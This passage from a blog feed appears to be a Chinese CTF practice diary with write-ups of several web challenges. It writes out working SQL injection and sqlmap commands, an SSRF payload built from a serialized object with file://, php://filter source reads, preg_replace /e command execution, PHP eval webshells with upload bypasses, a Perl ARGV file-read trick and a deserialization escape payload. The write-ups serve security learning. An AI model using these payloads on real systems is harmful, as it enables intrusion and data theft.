class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审阅源码发现get()可能存在ssrf服务端楼的那个，join一个账号,点username页面跳转，发现一个注入点</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:44796/view.php?no=1</span><br></pre></td></tr></table></figure><p>下面开始注入测试：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">no=1 order by 5<span class="comment">#//报错，说明没有五个字段，并且爆出了路径在 /var/www/html/db.php下</span></span><br><span class="line">no=1 order by 5<span class="comment">#//正常回显，说明是4个字段，下面开始爆库</span></span><br></pre></td></tr></table></figure><p>这里有一个注意的地方就是,经过多次测试发现union 和select不能同时使用，用注释/**/进行绕过</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">no = -1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#//爆出fakebook库</span></span><br><span class="line"><span class="keyword">no</span>= <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'fakebook'</span><span class="comment">#//爆出users表</span></span><br><span class="line"><span class="keyword">no</span> = <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">#爆出no,username,passwd,data字段</span></span><br><span class="line">下面可以一个个查询信息，可以看到<span class="keyword">data</span>中的数据进行了序列化</span><br><span class="line">O:8:"UserInfo":3&#123;s:4:"name";s:7:"hjfashd";s:3:"age";i:1123;s:4:"blog";s:13:"www.baidu.com";&#125;</span><br></pre></td></tr></table></figure><p>在目录扫描中可以看到存在flag.php，可以把blog改为/var/www/html/flag.php路径就可以拿到flag了,这里还要注意用file：//协议来读取,此外data在第四个字段，所以这里查询时也要放在第四位</p><p>到这里，我们就可以根据已知的信息来构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:no=-1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:3:"ggg";s:3:"age";i:12356;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查看网页源码，可以看到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg=='&gt;//base64解码就可以了</span><br></pre></td></tr></table></figure><h4 id="0X04ics-04-20-03-14"><a href="#0X04ics-04-20-03-14" class="headerlink" title="0X04ics-04 20-03-14"></a>0X04ics-04 20-03-14</h4><p>根据题目描述，在注册和登录页面存在漏洞，注册一个账号登录，提示说普通用户登录成功但没什么用，看来是要拿到管理员的账号，这里有个忘记密码的页面，但好像暂时没什么用</p><p>上工具，用sqlmap进行尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; --dbs&#x2F;&#x2F;爆出了四个库，经过尝试发现所要的数据在cetc004中</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 --tables&#x2F;&#x2F;爆出user表</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 -T user --columns&#x2F;&#x2F;爆出四个字段，answer，question，password，username</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/5.png" class=""><p>可以看到已经存在的账户信息，密码被加密了，未找到解密方法，回到注册和登录页面</p><p>经过测试发现注册页面相同的账户名可以注册多次，登录界面同账户不同密码都可以成功登录</p><p>注册一个名为c3tlwDmIn23的新账户登录就能拿到flag</p><h4 id="0X05ics-05-20-03-14"><a href="#0X05ics-05-20-03-14" class="headerlink" title="0X05ics-05 20-03-14"></a>0X05ics-05 20-03-14</h4><p>拿到题目在<code>http://111.198.29.45:59907/index.php?page=1</code>发现注入点，看到到变量传参，有可能存在文件包含漏洞读取源码，又是php站，想到使用php伪协议读取源码</p><p><code>http://111.198.29.45:59907/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>base64解密，整理一下源码，这里就只附上重点部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到首先是一个判断，也就是访问是否来自本机，用X-Forwarded-For进行伪造即可</p><p>再来分析一下主题部分，通过get传入pattern、replacement、subject三个参数的值，通过preg_replace()函数，在subject找指定的pattern部分用replacement来进行替代</p><p>通过查找资料了解了preg_replace函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reg_replace 函数执行一个正则表达式的搜索和替换</span><br><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</span><br><span class="line">• $pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">• $replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">• $subject: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line">• $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span><br><span class="line">• $count: 可选，为替换执行的次数。</span><br><span class="line">这个函数有个漏洞</span><br><span class="line">当$pattern使用了&#x2F;e修正符，替换的时候会把$replacement替换进去的代码当成php代码执行，当然要构成合法的php代码才能正确执行。</span><br></pre></td></tr></table></figure><p>思路出来了，用burp抓包</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/6.png" class=""><p>可以看到页面成功回显了</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/7.png" class=""><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;ls&quot;)&amp;&amp;sub=test</code></p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/8.png" class=""><p>下面一步需要注意，由于这里对空格进行了处理，可以用+或者%20来替代，“&amp;”用%26替代</p><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir%26%26+ls&quot;)&amp;&amp;sub=test</code></p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/9.png" class=""><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir/flag%26%26+ls&quot;)&amp;&amp;sub=test</code></p><p>找到了flag.php文件，这里就不贴图了</p><p>最后用cat来读取<code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cat+s3chahahaDir/flag/flag.php&quot;)&amp;&amp;sub=test</code></p><h4 id="0X06Bug-20-03-15"><a href="#0X06Bug-20-03-15" class="headerlink" title="0X06Bug  20-03-15"></a>0X06Bug  20-03-15</h4><p>打开题目场景是一个登录界面，有注册和修改密码的选项，先注册一个账号登录上去看看</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/10.png" class=""><p>点击manage选项，无法打开，有弹窗提示：You are not admin,很明显需要管理员账号登录，但是注册时显示账号已存在，看来关键点在修改密码的页面，抓包，成功将user改成admin，再次登录，点击manage，提示Ip not Allowed,抓包，加上X-Forwarded-For:127.0.0.1,成功打开，没什么提示，查看网页源码，发现信息</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/11.png" class=""><p>根据提示传入参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:39291&#x2F;index.php?module&#x3D;filemanage&amp;do&#x3D;1&#x2F;&#x2F;提示action is not correct</span><br><span class="line">尝试将do改成download，read，write，upload，最后发现时upload</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/12.png" class=""><p>接下来就是上传文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在测试中发现有&lt;?php会报错，这就想到用php的脚本模式</span><br><span class="line">构造内容:</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&quot;cmd&quot;])&lt;&#x2F;script&gt;以php后缀上传，burp抓包</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/13.png" class=""><p>根据提示尝试后缀名的绕过，在过程中发现对Content-Type有进行检测，将其改为image/jpeg，后缀名在已知的绕过方法中最后发现php4|php5可以，成功拿到flag</p><h4 id="0X07ics-07-20-03-18"><a href="#0X07ics-07-20-03-18" class="headerlink" title="0X07ics-07 20-03-18"></a>0X07ics-07 20-03-18</h4><p>打开界面，发现项目管理页面有跳转，有view-source可以看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">        $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">        $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">        $result = mysql_query($sql);</span><br><span class="line">        $result = mysql_fetch_object($result);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line">      <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">floatval($_GET[id]) !== <span class="string">'1'</span><span class="comment">//浮点数不能为1</span></span><br><span class="line">substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>)<span class="comment">//id的倒数最后一个数为9</span></span><br><span class="line">mysql_real_escape_string（ ）函数会在单引号前加\依次来防止sql注入</span><br><span class="line"><span class="comment">//这里可以用1/9进行绕过</span></span><br></pre></td></tr></table></figure><p>过了这一步来看下一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">       $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">       $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">       $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">           $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">           fwrite($f, $con);</span><br><span class="line">           fclose($f);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$filename = <span class="string">"backup/"</span>.$file;<span class="comment">//backup是伪路径，这里用../可以绕过</span></span><br><span class="line">preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename)<span class="comment">//这一段正则真的没看懂，看了大佬的wp说是只过滤在最后一个点的后缀，可以用/.或者两个.php文件来绕过</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:file=../<span class="number">4.</span>php/.&amp;con=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问uploaded/4.php</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/15.png" class=""><p>用system来爆出路径下的文件，可以看到有flag.php,用cat来读取，在网页源码可以看到flag</p><p>还有一种方法是用菜刀连接，这里就不演示了</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/14.png" class=""><h4 id="0X08i-got-id-20-03-18"><a href="#0X08i-got-id-20-03-18" class="headerlink" title="0X08i-got-id 20-03-18"></a>0X08i-got-id 20-03-18</h4><p>打开有三个跳转链接，其中一个提示是Perl，有一个是文件上传页面，应该是Perl文件上传，去百度了以下有关的知识，猜测一下后台的逻辑</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> $cgi=CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span>($cgi-&gt;upload(<span class="string">'file'</span>))&#123;</span><br><span class="line"><span class="keyword">my</span> $file=$cgi-&gt;param(<span class="string">'file'</span>);</span><br><span class="line"><span class="keyword">while</span> (&lt;$file&gt;)&#123;<span class="keyword">print</span> <span class="string">"$_"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的</span><br></pre></td></tr></table></figure><p>接下来上传一个argv文件再上传正常的文件，用bash来读取目录</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/16.png" class=""><p>接着直接读取/flag，就可以了</p>]]></content>
      
      
      
        <tags>
            
            <tag> train </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuojdiary</title>
      <link href="/2020/02/26/buuojdiary/"/>
      <url>/2020/02/26/buuojdiary/</url>
      
        <content type="html"><![CDATA[<p>[0CTF piapiapia]<a id="more"></a></p><p>前几天i春秋的比赛里面有一道反序列化逃逸的题目，对于菜鸡而言真的是一脸懵逼，后来看了出题人的出题笔记，找到了这道题，废话不多说，进入正题。</p><p>分析：扫描目录，可以从返回中找到<a href="http://www.zip，从而能够得到网站的逻辑和源码" target="_blank" rel="noopener">www.zip，从而能够得到网站的逻辑和源码</a></p><p>(1)注册 (2)登录 (3)修改信息</p><p>config.php中内容:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大概知道了需要读取config.php来拿到flag</p><p>接下来看一下profile.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure><p>从代码来看,所要做的应该就是让$profile[‘photo’]=’profile.php’，这里有一个反序列化，那么应该就是要利用反序列化漏洞来读取profile.php，这样就能得到base64加密过的信息</p><p>再来看update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure><p>可以看出phone、email、nackname、photo都是可以进行操作的</p><p>在设置了profile的信息之后会调用这个函数进行处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在filter方法中进行了过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的东西，就是根据树哥的blog来做的，根据那篇文章这道题的点应该在nickname这里,可以看到filter中会用hacker来替代数组里的东西，也就有where的地方就会挤出字符</p><p>第一个长度限制可以用数组进行绕过,也就是nickname[]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure><p>下面来看一下正常序列化的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">Array</span>(</span><br><span class="line"> <span class="string">'phone'</span> =&gt; <span class="string">'12345678911'</span>,</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'woc2@qq.com'</span>,</span><br><span class="line">    <span class="string">'nickname'</span> =&gt; [<span class="string">'hello'</span>],</span><br><span class="line">    <span class="string">'photo'</span> =&gt; <span class="string">'upload/'</span>.md5(<span class="string">'123.jpg'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//a:4&#123;s:5:"phone";s:11:"12345678911";s:5:"email";s:11:"woc2@qq.com";s:8:"nickname";a:1&#123;i:0;s:5:"hello";&#125;s:5:"photo";s:39:"upload/f47454d1d3644127f42070181a8b9afc";&#125;</span></span><br></pre></td></tr></table></figure><p>现在要做的就是往nickname里塞入profile.php，直接给payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"15000000000"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"woc2@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>&#123;i:<span class="number">0</span>;s:<span class="number">204</span>:<span class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;s:<span class="number">39</span>:<span class="string">"upload/f47454d1d3644127f42070181a8b9afc"</span>;&#125;</span><br><span class="line">这里<span 